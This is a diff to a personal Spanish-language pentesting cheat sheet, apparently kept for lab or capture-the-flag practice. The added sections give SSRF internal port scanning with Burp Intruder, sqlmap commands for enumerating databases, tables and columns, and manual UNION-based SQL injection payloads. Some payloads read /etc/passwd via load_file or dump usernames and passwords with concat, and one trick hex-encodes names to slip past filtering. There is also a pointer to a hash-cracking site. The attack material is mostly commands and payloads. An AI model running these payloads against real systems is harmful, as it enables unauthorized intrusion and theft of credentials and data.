@@ -2,6 +2,9 @@
 poner en google:
 reverse shell monkey pentester (para buscar formas de obtener una reverse shell via comandos)
 
+hashes.org para crackear hashes :)))
+
+
 --------------------------------///////\\\\\\\--------------------------------------
 
 //NMAP 
@@ -254,8 +257,116 @@ nosotros hayamos puesto.
 
 // SSRF (SERVER-SIDE REQUEST FORGERY)
 
+No necesitamos la interaccion del usuario :)
+
+Sirve para cuando no vemos todos los puertos abiertos. De esta forma podemos ver que puertos estan
+abiertos y corriendo servidores internos.
+
+Lo que hariamos seria lo siguiente, interceptariamos por burpsuite la peticion al localhost empezando
+por el puerto 1.
+
+interceptamos esto que este en un buscador de urls o algo asi. (no en la comun de arriba, en la pagina.)
+http://localhost:1
+lo mandamos al intruder. ctrl + i
+en la formurl=codigo raro
+seleccionamos codigo raro y le damos a ctrl+shift+u
+seleccionamos el 1 y le damos a "add"
+nos vamos a payload y le damos a numbers from 1 a 65535. step 1
+le damos a start attack y los que den un length mas largo de lo comun es q generalmente esta abierto.
+
+
 --------------------------------///////\\\\\\\----------------------------------
 
+// SQL INYECTION
+
+
+----SQLmap----
+
+
+necesitamos tener un panel de autenticacion.
+buscamos el login por searchsploit y nos fijamos si tiene lugar a sqlinyection.
+nos fijamos la ruta url para inyectarlo y cachapum:
+
+
+sqlmap -u "http://IP/ruta/hacia/vulnerabilidad" --cookie "nuestra cookie (si tenemos que logearnos)"
+--dbs --batch --random-agent (si ya sabemos que tipo de sql es, ponemos: --dbms=<mysql> por ejemplo)
+  ^
+  |
+database
+
+otros parametros para cuando ya tenemos las databases:
+-D (la base que queremos acceder) en vez de --dbs
+y le agragamos tambien --tables para acceder a las tablas
+
+despues una vez obtenidas las tablas, le damos estos parametros:
+en vez de --tables le damos -T (la tabla que deseamos obtener)
+tambien le damos el parametro --columns para ver las columnas
+le damos a correr denuevo y cuando ya tenemos las columnas, en vez del parametro --columns
+le damos el parametro:
+-C (nombres de las columnas separadas por , )
+ 
+
+
+----INYECCION-MANUAL----
+
+
+lo primero que hacemos es ir a la ruta que es inyectable y donde dice id="algo" o lo que sea le ponemos
+esto: por ejemplo (id=1 order by 100-- -). asi vemos cuantas columnas hay.
+                                  ⤥
+				    bajamos este numero hasta que encontremos la cantidad de columnas.
+
+luego en lugar de donde decia order by 100 lo cambio por esto:
+"union select 1,2,3,4,...,n-- -" siendo n la cantidad de columnas que hayamos encontrado.
+
+Ahora, reemplazamos algun numero que nos aparezca por un comando.
+ 
+Comandos utiles de sql:
+
+-database() -----> para saber en que database estamos
+
+-user() -----> para saber que usuario esta corriendo la base de datos.
+
+-@@version -----> vemos la version de sql en uso.
+
+-load_file('/etc/passwd') -----> podemos ver archivos internos (a veces no funciona).
+
+-schema_name ------> para ver todas las bases de datos (su uso es de la siguiente manera:
+"union select 1,schema_name,3,4,...,n from information_schema.schemata-- -") 
+
+si a todo esto le agrego un (del ejemplo anterior:
+"union select 1,schema_name,3,4,...,n from information_schema.schemata limit <1>,1") 
+podemos limitar lo que se nos muestra                                         ^
+                                                                              |
+                                                                     solo cambiamos este
+								     parametro.     
+
+
+una vez que sabemos la database ponemos lo siguiente:
+union select 1,table_name,3,4,...,n from information_schema.tables where table_schema = "db encontrada"-- -
+
+cuando ya tenemos la table ponemos lo siguiente:
+union select 1,column_name,3,4,...,n from information_schema.columns where table_schema = "db encontrada" and table_name = "tabla encontrada"-- -
+
+una vez que tengamos todo lo deseado y querramos ver contrasenas, usuarios, etc, podriamos hacer lo siguiente:
+union select 1,concat(username,0x,password),3,4,...,n from dbencontrada.tablaencontrada-- -
+
+
+
+
+si por alguna razon cuando queremos inyectar el nombre de una tabla, schema o columna no nos deja podriamos hacer lo
+siguiente, en una terminal poner:
+
+echo "tabla, schema o columna" | xxd -ps para tenerlo sanitizado, lo copiamos sin el 0a del final y le agregamos
+un 0x al principio.
+
+y lo pondriamos de la siguiente forma (por ejemplo):
+union select 1,table_name,3,4,...,n from information_schema.tables where table_schema = 0x736368656d61-- -
+
+
+
+
+ 
+--------------------------------///////\\\\\\\----------------------------------
 
 // USER PRIVILIGE ESCALATION
 
